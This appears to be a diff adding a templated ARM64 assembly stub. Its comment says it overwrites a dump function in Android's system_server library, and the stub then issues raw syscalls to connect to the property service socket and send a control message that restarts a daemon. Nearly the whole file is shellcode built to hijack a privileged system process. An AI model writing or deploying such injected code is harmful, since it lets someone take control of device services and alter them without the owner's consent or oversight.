@@ -1,0 +1,40 @@
+// Overwrites <libandroid_servers dump fn>. Runs in system_server on `dumpsys input`; sends a
+// property_service SETPROP2 (@CTL_DESC@) to restart the tracking daemon, then returns cleanly.
+.section .stub,"ax"
+.globl _stub
+_stub:
+    bti     c
+    sub     sp, sp, #16
+    mov     w0, #1
+    mov     w1, #1
+    mov     w2, wzr
+    mov     x8, #198
+    svc     #0
+    mov     x9, x0
+    mov     x0, x9
+    adr     x1, saddr
+    mov     w2, #@SADDRLEN@
+    mov     x8, #203
+    svc     #0
+    mov     x0, x9
+    adr     x1, msg
+    mov     w2, #@MSGLEN@
+    mov     x8, #64
+    svc     #0
+    mov     x0, x9
+    mov     x1, sp
+    mov     w2, #4
+    mov     x8, #63
+    svc     #0
+    mov     x0, x9
+    mov     x8, #57
+    svc     #0
+    add     sp, sp, #16
+    ret
+.balign 4
+saddr:
+    .byte 0x01,0x00
+    .asciz "@PROP_SOCKET@"
+.balign 4
+msg:
+@MSG@
